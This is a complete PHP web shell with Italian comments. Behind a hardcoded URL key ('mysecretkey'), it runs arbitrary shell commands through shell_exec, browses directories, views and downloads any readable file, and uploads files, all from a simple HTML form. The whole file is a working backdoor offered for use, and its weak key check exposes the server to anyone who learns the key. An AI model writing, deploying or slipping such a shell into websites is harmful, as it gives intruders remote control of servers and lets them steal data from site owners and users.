<?php
// Configurazione
define('SECRET_KEY', 'mysecretkey'); // Chiave segreta
define('LOG_FILE', 'command_log.txt'); // File di log

// Protezione con chiave segreta hashata
if (!isset($_GET['key']) || hash('sha256', $_GET['key']) !== hash('sha256', SECRET_KEY)) {
    die('Access denied');
}

// Logging dei comandi
function log_command($cmd) {
    file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] $cmd\n", FILE_APPEND);
}

// Esegui comandi remoti
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    log_command($cmd);
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}

// Naviga nel file system
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    if ($action === 'ls') {
        $dir = isset($_GET['path']) ? $_GET['path'] : '.';
        echo "<pre>";
        foreach (scandir($dir) as $file) {
            echo $file . "\n";
        }
        echo "</pre>";
    } elseif ($action === 'view') {
        $file = $_GET['file'];
        if (is_readable($file)) {
            echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
        } else {
            echo "File non leggibile o non trovato.";
        }
    } elseif ($action === 'download') {
        $file = $_GET['file'];
        if (is_readable($file)) {
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            readfile($file);
            exit;
        } else {
            echo "File non leggibile o non trovato.";
        }
    }
}

// Caricamento file
if (isset($_FILES['file']['tmp_name'])) {
    $target = basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "File uploaded to: " . realpath($target);
}

// Interfaccia utente migliorata
?>
<html>
    <body>
        <h2>PHP Shell</h2>
        <form method="post">
            <input type="text" name="cmd" placeholder="Command" />
            <button type="submit">Execute</button>
        </form>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" />
            <button type="submit">Upload</button>
        </form>
        <a href="?key=mysecretkey&action=ls">List Files</a><br>
        <form method="get">
            <input type="hidden" name="key" value="mysecretkey">
            <input type="hidden" name="action" value="view">
            <input type="text" name="file" placeholder="File to view">
            <button type="submit">View File</button>
        </form>
        <form method="get">
            <input type="hidden" name="key" value="mysecretkey">
            <input type="hidden" name="action" value="download">
            <input type="text" name="file" placeholder="File to download">
            <button type="submit">Download File</button>
        </form>
    </body>
</html>
